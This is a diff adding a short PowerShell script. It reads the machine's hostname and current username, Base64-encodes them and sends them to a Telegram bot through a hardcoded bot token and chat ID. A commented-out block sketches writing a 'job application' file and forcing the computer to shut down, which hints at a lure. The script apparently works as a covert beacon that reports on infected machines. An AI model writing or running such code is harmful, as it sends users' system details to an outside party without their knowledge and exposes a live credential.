@@ -1,0 +1,18 @@
+<# 
+Mesaj:
+$Message = "job application"
+
+Create File : 
+New-Item -Path c: -Name "File.txt" -ItemType "file" -Value $Message
+
+Shutdown:  
+Stop-Computer -Force
+#>
+
+$a=hostname
+$b=$env:username
+$c="HOSTNAME: " + $a + "             USERNAME: " + $b
+$d=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($c))
+$MyToken = "643440344:AAHNr9JkCkLvUcVErXLzeOY2pGt5uRSNi-M"
+$chatID = -1001284650874
+$Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($MyToken)/sendMessage?chat_id=$($chatID)&text=$($d)"
